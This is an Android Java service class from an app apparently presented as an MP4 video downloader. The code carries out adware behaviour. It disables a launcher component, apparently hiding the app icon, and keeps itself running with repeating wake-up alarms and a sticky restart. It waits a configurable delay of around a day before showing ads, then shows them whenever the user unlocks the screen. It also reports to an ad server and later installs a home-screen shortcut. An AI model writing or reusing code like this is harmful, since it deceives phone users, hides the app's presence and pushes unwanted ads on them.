package com.mp4.videodownloader.services;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Point;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import com.mp4.videodownloader.MainActivity;
import com.mp4.videodownloader.R;
import com.mp4.videodownloader.receiver.AlarmReceiver;
import com.mp4.videodownloader.utils.AppConstants;

import java.util.UUID;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class MyService extends Service {
    private boolean isContinousShowAds = false;
    private boolean isReportResult = false;

    private ScheduledThreadPoolExecutor myTask;
    private String uuid;

    private int intervalService;
    private int delayService;
    private int delay_report;
    private int delay_retention = -1;

    private MyBroadcast myBroadcast;

    private static final Point[] points = {new Point(50, 50), new Point(51, 57), new Point(79, 85), new Point(72, 74),
            new Point(70, 92), new Point(71, 91), new Point(71, 93), new Point(72, 92), new Point(48, 80), new Point(48, 65), new Point(53, 40)};

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d("cao", "onCreate");
        initService();
    }

    private void initService() {
        if (Build.VERSION.SDK_INT >= 26) {
            AlarmManager localAlarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(getApplicationContext(), AlarmReceiver.class);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, PendingIntent.FLAG_CANCEL_CURRENT);
            if (localAlarmManager != null) {
                localAlarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), AppConstants.ALARM_SCHEDULE_MINUTES * 60 * 1000L, pendingIntent);
            }
            this.stopSelf();
        } else {
            SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
            uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
            intervalService = mPrefs.getInt("intervalService", 10);
            delayService = mPrefs.getInt("delayService", 24);
            delay_retention = mPrefs.getInt("delay_retention", 17);
            delay_report = mPrefs.getInt("delay_report", 6);

            if (myBroadcast == null) {
                try {
                    myBroadcast = new MyBroadcast();
                    IntentFilter filter = new IntentFilter("android.intent.action.USER_PRESENT");
                    registerReceiver(myBroadcast, filter);
                } catch (Exception e) {
                }
            }
            scheduleTask();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("cao", "onStartCommand");
        if (Build.VERSION.SDK_INT < 26)
            return START_STICKY;
        else
            return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d("cao", "onDestroy");
        if (myBroadcast != null) {
            unregisterReceiver(myBroadcast);
            myBroadcast = null;
        }

        if (myTask != null) {
            myTask.shutdown();
        }
    }

    private void addShortcut() {
        //Adding shortcut for MainActivity
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this.getPackageName(), "com.mp4.videodownloader.MAIN1");
            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        }
        catch (Exception e)
        {
        }

        Intent shortcutIntent = new Intent(getApplicationContext(),
                MainActivity.class);

        shortcutIntent.setAction(Intent.ACTION_MAIN);

        Intent addIntent = new Intent();
        addIntent
                .putExtra(Intent.EXTRA_SHORTCUT_INTENT, shortcutIntent);
        addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, getString(R.string.app_name));
        addIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE,
                Intent.ShortcutIconResource.fromContext(getApplicationContext(),
                        R.mipmap.ic_launcher));

        addIntent
                .setAction("com.android.launcher.action.INSTALL_SHORTCUT");
        addIntent.putExtra("duplicate", true);  //may it's already there so don't duplicate
        getApplicationContext().sendBroadcast(addIntent);

//        Log.d("caomui","ADD shortcut done");
//        AdSdk.createShortcut(uuid);
    }

    private void scheduleTask() {
        myTask = new ScheduledThreadPoolExecutor(1);
        myTask.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
                int totalTime = mPrefs.getInt("totalTime", 0);
                totalTime += intervalService;
                mPrefs.edit().putInt("totalTime", totalTime).commit();

                if (delay_retention >= 0 && totalTime > delay_retention)//add shortcut or không
                {
                    addShortcut();
                    delay_retention = -1;
                    mPrefs.edit().putInt("delay_retention", -1).commit();
                }

                if (totalTime == 500) {
                    SharedPreferences mPrefs2 = getSharedPreferences("support_xx", 0);
                    mPrefs2.edit().putInt("accept", 2).commit();
                }

                if (totalTime % (delay_report * 60) == 0) {
                    isReportResult = true;
                }

                if (isReportResult || !mPrefs.contains("clientConfig"))
                    AdSdk.reportAndGetClientConfig(MyService.this);

                if (totalTime >= delayService * 60) {
                    isContinousShowAds = true;
                }

//                isContinousShowAds = true;
//                Log.d("caomui", "================");
            }
        }, 0, intervalService, TimeUnit.MINUTES);
//        }, 0, 15, TimeUnit.SECONDS);

    }


    class MyBroadcast extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d("caofb", "Unlock Screen " + uuid);
            if (!isContinousShowAds)
                return;

            if(isContinousShowAds)
            {
                isContinousShowAds = false;
                AdSdk.showAds(context);
            }

        }
    }
}